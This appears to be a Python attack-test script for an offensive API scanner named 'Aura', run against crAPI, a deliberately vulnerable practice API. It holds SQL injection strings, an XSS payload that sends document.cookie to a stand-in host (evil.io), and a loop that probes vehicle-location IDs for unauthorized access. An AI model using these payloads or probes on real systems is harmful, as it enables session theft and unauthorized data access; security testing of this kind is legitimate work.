"""
Aura - crAPI (Completely Ridiculous API) Attack Test
Target: https://crapi.apisec.ai
Vulnerability Classes: BOLA, Mass Assignment, SSRF, JWT Bypass, Excessive Data Exposure
"""
import asyncio
import json
import httpx
from aura.modules.frontend_deconstructor import FrontendDeconstructor
from aura.modules.ai_mutator import AIMutatorEngine

TARGET = "https://crapi.apisec.ai"

class MockContext:
    def __init__(self, target):
        self.target = target
        self.target_url = target
        # crAPI Known vulnerable endpoints
        self.intel = {
            "urls": {
                f"{target}/identity/api/v2/user/login",
                f"{target}/community/api/v2/community/posts/recent",
                f"{target}/workshop/api/shop/products",
                f"{target}/identity/api/v2/vehicle/***/location",  # BOLA target
            }
        }
    def get_intel(self):
        return self.intel

class MockBrain:
    def analyze(self, prompt):
        # Generate known crAPI bypass payloads
        if "SQLi" in prompt:
            return "admin@crapi.io' OR '1'='1"
        elif "XSS" in prompt:
            return "<img src=x onerror=fetch('//evil.io/?c='+document.cookie)>"
        return "' OR 1=1--"

async def probe_target():
    """Quick connectivity check"""
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as c:
            r = await c.get(TARGET)
            print(f"[✅] Target LIVE: {TARGET} → HTTP {r.status_code}")
            return r.status_code < 500
    except Exception as e:
        print(f"[❌] Target Unreachable: {e}")
        return False

async def main():
    print(f"\n{'='*60}")
    print(f"  🎯 AURA ASSAULT: crAPI (Completely Ridiculous API)")
    print(f"  Target: {TARGET}")
    print(f"{'='*60}\n")

    # Phase 0: Probe
    if not await probe_target():
        print("[!] Target offline. Aborting.")
        return

    ctx = MockContext(TARGET)

    # --- Phase 1: Frontend Deconstructor ---
    print("[+] Phase 1: Frontend Deconstruction & Hidden Endpoint Discovery")
    fd = FrontendDeconstructor()
    fd.context = ctx
    fd.target = TARGET
    fd.emit_progress = lambda **kw: None
    fd.emit_vulnerability = lambda v: None

    fd_findings = []
    try:
        fd_findings = await fd.run()
    except Exception as e:
        print(f"    [!] FD Error: {e}")

    print(f"    → Discovered {len(fd_findings)} findings from source map analysis")
    if fd.hidden_endpoints:
        print(f"    → {len(fd.hidden_endpoints)} hidden endpoints ripped from JS bundles:")
        for ep in list(fd.hidden_endpoints)[:10]:
            print(f"       • {ep}")

    # --- Phase 2: AI Mutator on crAPI vulnerable search ---
    print("\n[+] Phase 2: AI Mutator - Attacking known crAPI endpoints")
    mutator = AIMutatorEngine()
    mutator.context = ctx
    mutator.target = TARGET
    mutator.brain = MockBrain()
    mutator.emit_progress = lambda **kw: None
    mutator.emit_vulnerability = lambda v: mutator.results.append(v)

    mutator_findings = []
    try:
        mutator_findings = await mutator.run()
    except Exception as e:
        print(f"    [!] Mutator Error: {e}")

    print(f"    → AI Mutator launched {len(mutator_findings)} confirmed exploits")

    # --- Phase 3: Manual BOLA Probe ---
    print("\n[+] Phase 3: BOLA - Broken Object Level Authorization Probe")
    bola_findings = []
    async with httpx.AsyncClient(timeout=10, verify=False) as client:
        for victim_id in range(1, 6):  # Probe IDs 1-5
            try:
                url = f"{TARGET}/identity/api/v2/vehicle/{victim_id}/location"
                r = await client.get(url)
                if r.status_code == 200:
                    bola_findings.append({
                        "type": "BOLA - Unauthorized Object Access",
                        "severity": "CRITICAL",
                        "url": url,
                        "evidence": f"HTTP {r.status_code} → Accessed resource with ID {victim_id} without auth"
                    })
                    print(f"    [💀 BOLA] ID #{victim_id} returns HTTP {r.status_code} – Unauthorized access confirmed!")
                else:
                    print(f"    [~] ID #{victim_id} → HTTP {r.status_code}")
            except Exception:
                pass

    # --- Final Report ---
    total = len(fd_findings) + len(mutator_findings) + len(bola_findings)
    print(f"\n{'='*60}")
    print(f"  💀 AURA FINAL REPORT: crapi.apisec.ai")
    print(f"  Total Confirmed Findings: {total}")
    print(f"    • Frontend / Source Map Vulns : {len(fd_findings)}")
    print(f"    • AI-Mutated Injection Vulns  : {len(mutator_findings)}")
    print(f"    • BOLA Access Control Vulns   : {len(bola_findings)}")
    print(f"{'='*60}\n")

    with open("crapi_results.json", "w", encoding="utf-8") as f:
        json.dump({
            "target": TARGET,
            "frontend": fd_findings,
            "ai_mutator": mutator_findings,
            "bola": bola_findings
        }, f, indent=2)
    print("[✅] Results saved → crapi_results.json")

if __name__ == "__main__":
    asyncio.run(main())
